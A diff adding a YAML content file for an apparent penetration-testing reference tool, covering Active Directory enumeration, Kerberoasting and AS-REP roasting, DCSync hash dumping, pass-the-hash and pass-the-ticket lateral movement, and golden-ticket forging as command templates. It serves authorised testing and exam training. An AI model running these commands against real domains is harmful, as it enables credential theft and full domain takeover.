@@ -1,0 +1,637 @@
+# Cephalo content — Active Directory realm (core seed)
+# Authorized testing only. AD lateral/cred cards carry credMode with all three
+# authored variants (password | nthash | kerberos). The engine renders the
+# SELECTED variant's template — it never synthesizes an auth segment (§5.1).
+sections:
+  - id: ad.p10.enum
+    title: AD Enumeration
+    os: ad
+    phase: enumeration
+    order: 100
+    description: Map the domain — users, groups, SPNs, ACLs, attack paths.
+    techniques: [ad.enum.smb, ad.enum.ldap, ad.enum.kerbrute, ad.enum.bloodhound]
+    packs: [oscp]
+  - id: ad.p10.credaccess
+    title: AD Credential Access
+    os: ad
+    phase: credential-access
+    order: 110
+    description: Roast tickets, dump secrets, abuse ADCS.
+    techniques: [ad.credaccess.asreproast, ad.credaccess.kerberoast, ad.credaccess.dcsync, ad.credaccess.adcs]
+    packs: [oscp]
+  - id: ad.p10.lateral
+    title: AD Lateral Movement
+    os: ad
+    phase: lateral-movement
+    order: 120
+    description: Move with password, NT hash (PtH) or Kerberos ticket (PtT).
+    techniques: [ad.lateral.psexec, ad.lateral.wmiexec, ad.lateral.evil-winrm]
+    packs: [oscp]
+  - id: ad.p10.persist
+    title: AD Persistence
+    os: ad
+    phase: persistence
+    order: 130
+    description: Golden tickets and other domain persistence (methodology).
+    techniques: [ad.persist.golden]
+    packs: [oscp]
+
+techniques:
+  - id: ad.enum.smb
+    title: SMB enumeration (AD lens)
+    os: [ad]
+    phase: enumeration
+    summary: Enumerate domain hosts, shares, users and password policy over SMB.
+    body: |
+      In a domain, SMB enumeration doubles as AD recon. Run it across the standard
+      toolset — each surfaces a slightly different view: netexec (users/policy/shares
+      in one sweep + signing status), smbmap (per-share READ/WRITE), rpcclient
+      (SAMR/LSARPC user+group dump), smbclient (raw share access). A null session
+      (`-u '' -p ''`) often works pre-creds; watch the banner for `signing:False`
+      (relay target) and READ/WRITE share perms.
+    commands:
+      - ad.enum.smb.users
+      - ad.enum.smb.passpol
+      - ad.enum.smb.smbmap
+      - ad.enum.smb.rpcclient
+      - ad.enum.smb.smbclient
+    tags: [smb, netexec, enumeration]
+    ports: [139, 445]
+    services: [smb]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.netexec, ref.smbmap]
+    confidence: verified
+    packs: [oscp]
+    relatedIds: [linux.enum.smb, ad.enum.rid, ad.cred.relay]
+
+  - id: ad.enum.ldap
+    title: LDAP enumeration
+    os: [ad]
+    phase: enumeration
+    summary: Pull users, groups and computer objects over LDAP.
+    commands: [ad.enum.ldap.netexec, ad.enum.ldap.ldapsearch]
+    tags: [ldap, enumeration]
+    ports: [389, 636, 3268]
+    services: [ldap]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.netexec]
+    confidence: verified
+    packs: [oscp]
+
+  - id: ad.enum.kerbrute
+    title: Kerberos user enumeration
+    os: [ad]
+    phase: enumeration
+    summary: Validate usernames over Kerberos pre-auth without lockout.
+    body: |
+      Kerbrute's `userenum` distinguishes valid from invalid principals via the
+      KDC's pre-auth response — quietly, without touching the lockout counter.
+    commands: [ad.enum.kerbrute.userenum]
+    tags: [kerberos, enumeration]
+    ports: [88]
+    services: [kerberos]
+    archetypeBand: high
+    references: [ref.kerbrute, ref.rfc4120]
+    confidence: verified
+    packs: [oscp]
+
+  - id: ad.enum.bloodhound
+    title: BloodHound collection
+    os: [ad]
+    phase: enumeration
+    summary: Collect the domain graph for attack-path analysis.
+    body: |
+      Run a remote collector (bloodhound.py) or on-host SharpHound, then import
+      the zip into BloodHound CE and run the cypher library (see the BloodHound
+      section).
+    commands: [ad.enum.bloodhound.py]
+    relatedIds: [ad.credaccess.kerberoast, ad.lateral.psexec]
+    tags: [bloodhound, enumeration]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.bloodhoundpy, ref.bloodhound]
+    confidence: verified
+    packs: [oscp]
+
+  - id: ad.credaccess.asreproast
+    title: AS-REP Roasting
+    os: [ad]
+    phase: credential-access
+    summary: Recover crackable AS-REP hashes for users without Kerberos pre-auth.
+    body: |
+      Accounts flagged DONT_REQ_PREAUTH return a crackable AS-REP. The Impacket
+      route works **without credentials** when fed a user list; netexec and Rubeus
+      do it authenticated. Crack the `$krb5asrep$` hash with hashcat mode 18200
+      (john: `krb5asrep`). OPSEC: requesting many AS-REPs is loud in event 4768.
+    commands:
+      - ad.credaccess.asrep.getnpusers
+      - ad.credaccess.asrep.netexec
+      - ad.credaccess.asrep.rubeus
+      - ad.credaccess.asrep.crack
+    tags: [asreproasting, kerberos, hashcat]
+    ports: [88]
+    services: [kerberos]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.impacket, ref.netexec, ref.rubeus, ref.hashcat]
+    confidence: verified
+    packs: [oscp]
+    relatedIds: [ad.enum.kerbrute, ad.cred.spray]
+
+  - id: ad.credaccess.kerberoast
+    title: Kerberoasting
+    os: [ad]
+    phase: credential-access
+    summary: Request TGS-REP tickets for SPN accounts and crack them offline.
+    body: |
+      Any authenticated user can request service tickets for SPN-bearing accounts;
+      the encrypted portion is crackable offline (hashcat 13100). Tool-flavour
+      variants below — Impacket, netexec or Rubeus.
+    commands: [ad.credaccess.kerberoast.getuserspns, ad.credaccess.kerberoast.crack]
+    relatedIds: [ad.credaccess.asreproast, ad.lateral.psexec]
+    tags: [kerberoasting, kerberos, hashcat]
+    ports: [88]
+    services: [kerberos]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.impacket, ref.rubeus, ref.hashcat]
+    confidence: verified
+    packs: [oscp]
+
+  - id: ad.credaccess.dcsync
+    title: DCSync
+    os: [ad]
+    phase: credential-access
+    summary: Replicate password hashes from the DC with replication rights.
+    body: |
+      A principal with `DS-Replication-Get-Changes(-All)` can ask the DC to
+      replicate secrets — including krbtgt. secretsdump performs the DRSUAPI
+      DCSync; the card swaps auth between password, NT hash and Kerberos.
+    commands: [ad.credaccess.dcsync.secretsdump]
+    tags: [dcsync, credential-access]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.impacket, ref.adsecurity]
+    confidence: verified
+    packs: [oscp]
+
+  - id: ad.credaccess.adcs
+    title: ADCS abuse (ESC, prereq-gated)
+    os: [ad]
+    phase: credential-access
+    summary: Find vulnerable certificate templates; abuse is template-prereq-specific.
+    body: |
+      ADCS ESC1-ESC16 abuses depend on exact template/CA prerequisites that vary
+      per environment — enumerate first, then match the specific ESC. Never assume
+      a template is vulnerable without confirming its prerequisites.
+    commands: [ad.credaccess.adcs.find]
+    tags: [acl-abuse, credential-access]
+    archetypeBand: high
+    references: [ref.certipy]
+    confidence: unverified
+    packs: [oscp]
+
+  - id: ad.lateral.psexec
+    title: PsExec lateral movement
+    os: [ad]
+    phase: lateral-movement
+    summary: SYSTEM shell over SMB via a service — password, PtH, or PtT.
+    body: |
+      Impacket psexec drops a service and returns a SYSTEM shell. Noisy (writes a
+      binary, creates a service). Choose the auth mode with the credMode switch.
+    commands: [ad.lateral.psexec.run]
+    tags: [pass-the-hash, pass-the-ticket, lateral-movement, impacket, smb]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.impacket]
+    confidence: verified
+    packs: [oscp]
+
+  - id: ad.lateral.wmiexec
+    title: WMIExec lateral movement
+    os: [ad]
+    phase: lateral-movement
+    summary: Semi-interactive shell over WMI — quieter than psexec.
+    commands: [ad.lateral.wmiexec.run]
+    tags: [pass-the-hash, lateral-movement, impacket]
+    services: [rpc]
+    ports: [135]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.impacket]
+    confidence: verified
+    packs: [oscp]
+
+  - id: ad.lateral.evil-winrm
+    title: Evil-WinRM session
+    os: [ad]
+    phase: lateral-movement
+    summary: Interactive PowerShell over WinRM — password, hash, or ticket.
+    commands: [ad.lateral.evilwinrm.run]
+    tags: [winrm, evil-winrm, lateral-movement]
+    services: [winrm]
+    ports: [5985, 5986]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.evilwinrm, ref.ms-winrm]
+    confidence: verified
+    packs: [oscp]
+
+  - id: ad.persist.golden
+    title: Golden Ticket (methodology)
+    os: [ad]
+    phase: persistence
+    summary: Forge a TGT from the krbtgt key — domain persistence.
+    body: |
+      With the krbtgt NT hash and the domain SID you can forge arbitrary TGTs.
+      This is total domain persistence — methodology + canonical syntax only.
+    commands: [ad.persist.golden.ticketer]
+    prerequisites: [ad.credaccess.dcsync]
+    tags: [pass-the-ticket, persistence]
+    archetypeBand: medium
+    references: [ref.impacket, ref.adsecurity]
+    confidence: verified
+    packs: [oscp]
+
+commands:
+  - id: ad.enum.smb.users
+    title: Domain users over SMB (netexec)
+    template: "netexec smb {{DC_IP}} -u '{{USER}}' -p '{{PASS}}' --users"
+    tool: netexec
+    description: Enumerate domain users via SAMR/LSA over SMB.
+    os: [ad]
+    phase: enumeration
+    tags: [smb, netexec]
+    confidence: verified
+    references: [ref.netexec]
+    danger: low
+    packs: [oscp]
+  - id: ad.enum.smb.passpol
+    title: Password policy (netexec)
+    template: "netexec smb {{DC_IP}} -u '{{USER}}' -p '{{PASS}}' --pass-pol"
+    tool: netexec
+    description: Read the domain password/lockout policy before spraying.
+    os: [ad]
+    phase: enumeration
+    tags: [smb, netexec]
+    notes:
+      - "Always read lockout threshold BEFORE any spray to avoid locking accounts."
+    confidence: verified
+    references: [ref.netexec]
+    danger: low
+    packs: [oscp]
+  - id: ad.enum.smb.smbmap
+    title: Share permissions (smbmap)
+    template: "smbmap -H {{DC_IP}} -u '{{USER}}' -p '{{PASS}}'"
+    tool: smbmap
+    description: Per-share READ/WRITE permissions at a glance.
+    os: [ad]
+    phase: enumeration
+    tags: [smb]
+    notes:
+      - "Watch for WRITE on a share — a foothold/relay/loot vector."
+      - "smbmap -H {{DC_IP}} -u '' -p '' for a null session."
+    confidence: verified
+    references: [ref.smbmap]
+    danger: low
+    packs: [oscp]
+  - id: ad.enum.smb.rpcclient
+    title: SAMR/LSARPC dump (rpcclient)
+    template: "rpcclient -U '{{USER}}%{{PASS}}' {{DC_IP}} -c 'enumdomusers;enumdomgroups;querydominfo'"
+    tool: rpcclient
+    description: Enumerate users/groups/domain info over MS-RPC.
+    os: [ad]
+    phase: enumeration
+    tags: [smb, rpc]
+    notes:
+      - "rpcclient -U '' -N {{DC_IP}} attempts an anonymous (null) bind."
+      - "Output to watch: rid:[0x...] user names → feed RID cycling / spraying."
+    confidence: verified
+    references: [ref.netexec]
+    danger: low
+    packs: [oscp]
+  - id: ad.enum.smb.smbclient
+    title: Raw share access (smbclient)
+    template: "smbclient -L //{{DC_IP}}/ -U '{{USER}}%{{PASS}}'"
+    tool: smbclient
+    description: List shares, then connect with //{{DC_IP}}/<share> to browse.
+    os: [ad]
+    phase: enumeration
+    tags: [smb]
+    notes:
+      - "Append -N for a null session; many DCs expose SYSVOL/NETLOGON read-only."
+    confidence: verified
+    references: [ref.netexec]
+    danger: low
+    packs: [oscp]
+
+  - id: ad.enum.ldap.netexec
+    title: LDAP users/groups (netexec)
+    template: "netexec ldap {{DC_IP}} -u '{{USER}}' -p '{{PASS}}' --users --groups"
+    tool: netexec
+    description: Pull users and groups over LDAP.
+    os: [ad]
+    phase: enumeration
+    tags: [ldap, netexec]
+    confidence: verified
+    references: [ref.netexec]
+    danger: low
+    packs: [oscp]
+  - id: ad.enum.ldap.ldapsearch
+    title: Raw LDAP query (ldapsearch)
+    template: "ldapsearch -x -H ldap://{{DC_IP}} -D '{{USER}}@{{DOMAIN}}' -w '{{PASS}}' -b 'DC=corp,DC=local' '(objectClass=user)'"
+    tool: ldapsearch
+    description: Direct LDAP search; adjust the base DN to the domain.
+    os: [ad]
+    phase: enumeration
+    tags: [ldap]
+    notes:
+      - "Replace the base DN (DC=corp,DC=local) with your target domain components."
+    confidence: verified
+    references: [ref.netexec]
+    danger: low
+    packs: [oscp]
+
+  - id: ad.enum.kerbrute.userenum
+    title: Kerberos user enumeration (kerbrute)
+    template: "kerbrute userenum --dc {{DC_IP}} -d {{DOMAIN}} {{WORDLIST}}"
+    tool: kerbrute
+    description: Validate usernames over Kerberos pre-auth (no lockout).
+    os: [ad]
+    phase: enumeration
+    tags: [kerberos, enumeration]
+    confidence: verified
+    references: [ref.kerbrute]
+    danger: low
+    packs: [oscp]
+
+  - id: ad.enum.bloodhound.py
+    title: Remote collection (bloodhound.py)
+    template: "bloodhound-python -u '{{USER}}' -p '{{PASS}}' -d {{DOMAIN}} -ns {{DC_IP}} -c All --zip"
+    tool: bloodhound.py
+    description: Collect the full domain graph remotely and zip it for import.
+    os: [ad]
+    phase: enumeration
+    tags: [bloodhound, enumeration]
+    confidence: verified
+    references: [ref.bloodhoundpy, ref.sharphound]
+    danger: low
+    packs: [oscp]
+    variants:
+      - id: ad.enum.bloodhound.py.remote
+        label: bloodhound.py (remote)
+        template: "bloodhound-python -u '{{USER}}' -p '{{PASS}}' -d {{DOMAIN}} -ns {{DC_IP}} -c All --zip"
+      - id: ad.enum.bloodhound.sharphound
+        label: SharpHound (on-host)
+        template: "SharpHound.exe -c All --zipfilename loot.zip"
+        shell: cmd
+        os: [windows, ad]
+      - id: ad.enum.bloodhound.nxc
+        label: netexec collector
+        template: "netexec ldap {{DC_IP}} -u '{{USER}}' -p '{{PASS}}' --bloodhound --collection All --dns-server {{DC_IP}}"
+
+  - id: ad.credaccess.asrep.getnpusers
+    title: AS-REP roast (Impacket GetNPUsers)
+    template: "impacket-GetNPUsers {{DOMAIN}}/ -dc-ip {{DC_IP}} -usersfile {{WORDLIST}} -format hashcat -no-pass -outputfile asrep.txt"
+    tool: impacket
+    description: Request AS-REPs for users lacking pre-auth; output hashcat format.
+    os: [ad]
+    phase: credential-access
+    tags: [asreproasting, kerberos]
+    confidence: verified
+    references: [ref.impacket]
+    danger: medium
+    packs: [oscp]
+  - id: ad.credaccess.asrep.netexec
+    title: AS-REP roast (netexec)
+    template: "netexec ldap {{DC_IP}} -u '{{USER}}' -p '{{PASS}}' --asreproast asrep.txt"
+    tool: netexec
+    description: Authenticated discovery + AS-REP capture in one pass.
+    os: [ad]
+    phase: credential-access
+    tags: [asreproasting, kerberos]
+    notes:
+      - "Writes hashcat-format $krb5asrep$ hashes to asrep.txt."
+    confidence: verified
+    references: [ref.netexec]
+    danger: medium
+    packs: [oscp]
+  - id: ad.credaccess.asrep.rubeus
+    title: AS-REP roast (Rubeus, on-host)
+    template: "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt"
+    shell: powershell
+    description: On-host AS-REP roast across the domain.
+    os: [ad, windows]
+    phase: credential-access
+    tags: [asreproasting, kerberos]
+    notes:
+      - "/user:{{TARGET_USER}} scopes it to one principal."
+    confidence: verified
+    references: [ref.rubeus]
+    danger: medium
+    packs: [oscp]
+  - id: ad.credaccess.asrep.crack
+    title: Crack AS-REP (hashcat 18200)
+    template: "hashcat -m 18200 asrep.txt {{WORDLIST}}"
+    tool: hashcat
+    description: Crack AS-REP roasted hashes offline.
+    os: [ad]
+    phase: credential-access
+    tags: [asreproasting, hashcat]
+    confidence: verified
+    references: [ref.hashcat]
+    danger: low
+    packs: [oscp]
+
+  - id: ad.credaccess.kerberoast.getuserspns
+    title: Kerberoast (request TGS)
+    template: "impacket-GetUserSPNs '{{DOMAIN}}/{{USER}}:{{PASS}}' -dc-ip {{DC_IP}} -request -outputfile spns.txt"
+    tool: impacket
+    description: Request TGS-REPs for SPN accounts; output crackable hashes.
+    os: [ad]
+    phase: credential-access
+    tags: [kerberoasting, kerberos]
+    references: [ref.impacket, ref.rubeus]
+    confidence: verified
+    danger: medium
+    packs: [oscp]
+    variants:
+      - id: ad.credaccess.kerberoast.getuserspns.impacket
+        label: Impacket
+        template: "impacket-GetUserSPNs '{{DOMAIN}}/{{USER}}:{{PASS}}' -dc-ip {{DC_IP}} -request -outputfile spns.txt"
+      - id: ad.credaccess.kerberoast.getuserspns.netexec
+        label: netexec
+        template: "netexec ldap {{DC_IP}} -u '{{USER}}' -p '{{PASS}}' --kerberoasting spns.txt"
+      - id: ad.credaccess.kerberoast.getuserspns.rubeus
+        label: Rubeus (on-host)
+        template: "Rubeus.exe kerberoast /outfile:spns.txt"
+        shell: powershell
+        os: [windows, ad]
+      - id: ad.credaccess.kerberoast.getuserspns.pth
+        label: Impacket (pass-the-hash)
+        template: "impacket-GetUserSPNs -hashes :{{NTHASH}} '{{DOMAIN}}/{{USER}}' -dc-ip {{DC_IP}} -request -outputfile spns.txt"
+      - id: ad.credaccess.kerberoast.getuserspns.aes
+        label: Impacket (AES key)
+        template: "impacket-GetUserSPNs -aesKey {{AESKEY}} '{{DOMAIN}}/{{USER}}' -dc-ip {{DC_IP}} -request -outputfile spns.txt"
+      - id: ad.credaccess.kerberoast.getuserspns.ccache
+        label: Impacket (ticket / -k)
+        template: "KRB5CCNAME=ticket.ccache impacket-GetUserSPNs -k -no-pass '{{DOMAIN}}/{{USER}}' -dc-ip {{DC_IP}} -request -outputfile spns.txt"
+  - id: ad.credaccess.kerberoast.crack
+    title: Crack TGS-REP (hashcat 13100)
+    template: "hashcat -m 13100 spns.txt {{WORDLIST}}"
+    tool: hashcat
+    description: Crack Kerberoasted service-ticket hashes offline.
+    os: [ad]
+    phase: credential-access
+    tags: [kerberoasting, hashcat]
+    confidence: verified
+    references: [ref.hashcat]
+    danger: low
+    packs: [oscp]
+
+  - id: ad.credaccess.dcsync.secretsdump
+    title: DCSync (secretsdump)
+    template: "impacket-secretsdump '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{DC_IP}} -just-dc-user {{TARGET_USER}}"
+    tool: impacket
+    description: Replicate a target user's secrets from the DC (DRSUAPI DCSync).
+    os: [ad]
+    phase: credential-access
+    tags: [dcsync, credential-access]
+    credMode: password
+    references: [ref.impacket, ref.adsecurity]
+    confidence: verified
+    danger: critical
+    packs: [oscp]
+    notes:
+      - "Requires replication rights (GetChanges / GetChangesAll) on the domain."
+      - "Use -just-dc-user krbtgt to grab the golden-ticket key."
+    variants:
+      - id: ad.credaccess.dcsync.secretsdump.pw
+        label: Password
+        credMode: password
+        template: "impacket-secretsdump '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{DC_IP}} -just-dc-user {{TARGET_USER}}"
+      - id: ad.credaccess.dcsync.secretsdump.nt
+        label: NT hash (PtH)
+        credMode: nthash
+        template: "impacket-secretsdump -hashes :{{NTHASH}} '{{DOMAIN}}/{{USER}}'@{{DC_IP}} -just-dc-user {{TARGET_USER}}"
+      - id: ad.credaccess.dcsync.secretsdump.krb
+        label: Kerberos (PtT)
+        credMode: kerberos
+        template: "impacket-secretsdump -k -no-pass '{{DOMAIN}}/{{USER}}'@{{DC_IP}} -just-dc-user {{TARGET_USER}}"
+
+  - id: ad.credaccess.adcs.find
+    title: Find vulnerable templates (Certipy)
+    template: "certipy find -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip {{DC_IP}} -vulnerable -stdout"
+    tool: certipy
+    description: Enumerate CAs/templates and flag vulnerable ESC conditions.
+    os: [ad]
+    phase: credential-access
+    tags: [acl-abuse]
+    notes:
+      - "Abuse depends on the exact ESC prerequisites — confirm before exploiting."
+    confidence: unverified
+    references: [ref.certipy]
+    danger: high
+    packs: [oscp]
+
+  - id: ad.lateral.psexec.run
+    title: PsExec (SYSTEM shell)
+    template: "impacket-psexec '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{TARGET}}"
+    tool: impacket
+    description: Service-based SYSTEM shell over SMB.
+    os: [ad]
+    phase: lateral-movement
+    tags: [pass-the-hash, lateral-movement, impacket]
+    credMode: password
+    references: [ref.impacket]
+    confidence: verified
+    danger: high
+    packs: [oscp]
+    notes:
+      - "Noisy — writes a binary and creates a service. Prefer wmiexec for stealth."
+    variants:
+      - id: ad.lateral.psexec.run.pw
+        label: Password
+        credMode: password
+        template: "impacket-psexec '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{TARGET}}"
+      - id: ad.lateral.psexec.run.nt
+        label: NT hash (PtH)
+        credMode: nthash
+        template: "impacket-psexec -hashes :{{NTHASH}} '{{DOMAIN}}/{{USER}}'@{{TARGET}}"
+      - id: ad.lateral.psexec.run.krb
+        label: Kerberos (PtT)
+        credMode: kerberos
+        template: "impacket-psexec -k -no-pass '{{DOMAIN}}/{{USER}}'@{{TARGET}}"
+
+  - id: ad.lateral.wmiexec.run
+    title: WMIExec (semi-interactive)
+    template: "impacket-wmiexec '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{TARGET}}"
+    tool: impacket
+    description: Quieter WMI-based shell — no service, no binary drop.
+    os: [ad]
+    phase: lateral-movement
+    tags: [pass-the-hash, lateral-movement, impacket]
+    credMode: password
+    references: [ref.impacket]
+    confidence: verified
+    danger: medium
+    packs: [oscp]
+    variants:
+      - id: ad.lateral.wmiexec.run.pw
+        label: Password
+        credMode: password
+        template: "impacket-wmiexec '{{DOMAIN}}/{{USER}}:{{PASS}}'@{{TARGET}}"
+      - id: ad.lateral.wmiexec.run.nt
+        label: NT hash (PtH)
+        credMode: nthash
+        template: "impacket-wmiexec -hashes :{{NTHASH}} '{{DOMAIN}}/{{USER}}'@{{TARGET}}"
+      - id: ad.lateral.wmiexec.run.krb
+        label: Kerberos (PtT)
+        credMode: kerberos
+        template: "impacket-wmiexec -k -no-pass '{{DOMAIN}}/{{USER}}'@{{TARGET}}"
+
+  - id: ad.lateral.evilwinrm.run
+    title: Evil-WinRM (PowerShell)
+    template: "evil-winrm -i {{TARGET}} -u '{{USER}}' -p '{{PASS}}'"
+    tool: evil-winrm
+    description: Interactive PowerShell over WinRM.
+    os: [ad]
+    phase: lateral-movement
+    tags: [winrm, evil-winrm, lateral-movement]
+    credMode: password
+    references: [ref.evilwinrm]
+    confidence: verified
+    danger: medium
+    packs: [oscp]
+    notes:
+      - "Kerberos mode needs a cached TGT (KRB5CCNAME) and correct clock skew."
+    variants:
+      - id: ad.lateral.evilwinrm.run.pw
+        label: Password
+        credMode: password
+        template: "evil-winrm -i {{TARGET}} -u '{{USER}}' -p '{{PASS}}'"
+      - id: ad.lateral.evilwinrm.run.nt
+        label: NT hash (PtH)
+        credMode: nthash
+        template: "evil-winrm -i {{TARGET}} -u '{{USER}}' -H {{NTHASH}}"
+      - id: ad.lateral.evilwinrm.run.krb
+        label: Kerberos (PtT)
+        credMode: kerberos
+        template: "evil-winrm -i {{TARGET}} -r {{DOMAIN}}"
+
+  - id: ad.persist.golden.ticketer
+    title: Forge a Golden Ticket (ticketer)
+    template: "impacket-ticketer -nthash {{KRBTGT_NTHASH}} -domain-sid {{DOMAIN_SID}} -domain {{DOMAIN}} Administrator"
+    tool: impacket
+    description: Forge a TGT for an arbitrary principal from the krbtgt key.
+    os: [ad]
+    phase: persistence
+    tags: [pass-the-ticket, persistence]
+    notes:
+      - "Set KRB5CCNAME to the generated .ccache, then use -k -no-pass to wield it."
+    confidence: verified
+    references: [ref.impacket, ref.adsecurity]
+    danger: critical
+    packs: [oscp]
